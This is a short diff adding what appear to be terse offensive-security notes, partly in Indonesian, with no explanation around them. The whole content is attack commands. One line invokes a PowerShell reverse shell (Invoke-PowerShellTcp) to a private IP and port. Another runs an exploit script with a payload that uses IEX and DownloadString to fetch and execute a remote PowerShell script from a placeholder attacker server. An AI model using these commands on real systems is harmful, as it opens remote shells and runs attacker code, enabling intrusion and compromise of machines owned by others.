@@ -1,0 +1,6 @@
+Invoke-PowerShellTcp -Reverse -IPAddress 10.8.27.249 -Port 6060
+
+
+exploit gini:
+
+python3 exploit.py ip "cmd /c powershell IEX (New-Object Net.WebClient).DownloadString('http://ipmu:port_servermu/namaexploit.ps1')"
